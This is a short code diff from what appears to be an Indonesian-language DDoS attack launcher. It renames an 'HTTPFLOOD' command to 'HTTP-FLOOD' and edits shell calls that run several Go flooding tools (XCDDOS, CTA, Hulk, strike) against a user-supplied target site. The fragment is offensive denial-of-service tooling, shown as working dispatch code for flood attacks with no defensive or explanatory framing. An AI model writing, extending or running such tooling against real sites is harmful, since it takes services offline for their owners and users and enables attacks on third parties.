@@ -1536,7 +1536,7 @@ def command():
             print('cek lagi')
             print('isi semua pertanyaan dengan benar')
 
-    elif command == "HTTPFLOOD" or command == "httpflood" :
+    elif command == "HTTP-FLOOD" or command == "http-flood" :
         try:
             target, thread, methode, t = get_info_l72()
             picture()
@@ -1558,7 +1558,7 @@ def command():
         try:
             target, thread, methode, t = get_info_l72()
             picture()
-            os.system(f'cd godzilla && go run XCDDOS.go -site {target} -data {methode} GET')
+            os.system(f'cd godzilla && go run XCDDOS.go -site {target} -data GET')
             os.system(f'cd godzilla && go run CTA.go -site {target} -data GET')
             os.system(f'cd godzilla && go run Hulk.go -site {target} -data GET')
             os.system(f'cd godzilla && go run strike.go -url {target} -method GET')
